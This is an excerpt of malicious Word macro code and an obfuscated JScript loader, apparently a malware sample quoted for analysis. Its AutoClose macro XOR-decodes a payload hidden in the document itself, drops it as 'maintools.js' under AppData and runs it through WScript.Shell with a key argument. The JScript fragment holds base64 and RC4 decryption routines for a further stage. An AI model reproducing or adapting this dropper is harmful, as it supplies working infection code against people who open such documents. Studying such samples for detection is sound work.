...
Public a As String
Public b As String
Function c(d() As Byte, e As Long) As Boolean
Dim g As Byte
g = 45
For i = 0 To e - 1
d(i) = d(i) Xor g
g = ((g Xor 99) Xor (i Mod 254))
Next i
c = True
End Function
Sub AutoClose()
...
Dim m As Long
Dim e As Long
m = FileLen(ActiveDocument.FullName)
l = FreeFile
Open (ActiveDocument.FullName) For Binary As #l
Dim n() As Byte
ReDim n(m)
Get #l, 1, n
Dim o As String
o = StrConv(n, vbUnicode)
Dim p, q
Dim s
Set s = CreateObject("vbscript.regexp")
s.Pattern = "MxOH8pcrlepD3SRfF5ffVTy86Xe41L2qLnqTd5d5R7Iq87mWGES55fswgG84hIRdX74dlb1SiFOkR1Hh"
Set q = s.Execute(o)
Dim t
If q.Count = 0 Then
GoTo k
...
GoTo k
End If
b = Environ("appdata") & "\Microsoft\Windows"
Set h = CreateObject("Scripting.FileSystemObject")
If Not h.FolderExists(b) Then
b = Environ("appdata")
End If
Set h = Nothing
Dim x
x = FreeFile
a = b & "\" & "maintools.js"
Open (a) For Binary As #x
Put #x, 1, v
Close #x
Erase v
Set y = CreateObject("WScript.Shell")
y.Run """" + a + """" + " EzZETcSXyKAdF_e5I2i1"
ActiveDocument.Save
Exit Sub
k:
Close #x
...
{WScript.Quit();}
function MTvK(CgqD){var XwH7 = CgqD.charCodeAt(0);
if (XwH7 === 0x2B || XwH7 === 0x2D) 
    return 62
if (XwH7 === 0x2F || XwH7 === 0x5F) 
    return 63
if (XwH7 < 0x30) 
    return -1
if (XwH7 < 0x30 + 10) 
...
var t2JG = 0;function XGH6 (b0tQ){mjqo[t2JG++] = b0tQ;}
...
function CpPT(bOe3,F5vZ)
{
    ...
    for (var i = 0; i < 256; i++)
        {s[i] = i;}
    for (var i = 0; i < 256; i++)
            {V2Vl = (V2Vl + s[i] + bOe3.charCodeAt(i % bOe3.length)) % 256;
                qyCq = s[i];
                s[i] = s[V2Vl];
                s[V2Vl] = qyCq;
            }
    ...
    for (var y = 0; y < F5vZ.length; y++)
        {i = (i + 1) % 256;V2Vl = (V2Vl + s[i]) % 256;qyCq = s[i];s[i] = s[V2Vl];
            s[V2Vl] = qyCq;mjqo += String.fromCharCode(F5vZ[y] ^ s[(s[i] + s[V2Vl]) % 256]);
        }
            return mjqo;}
function y3zb()
{
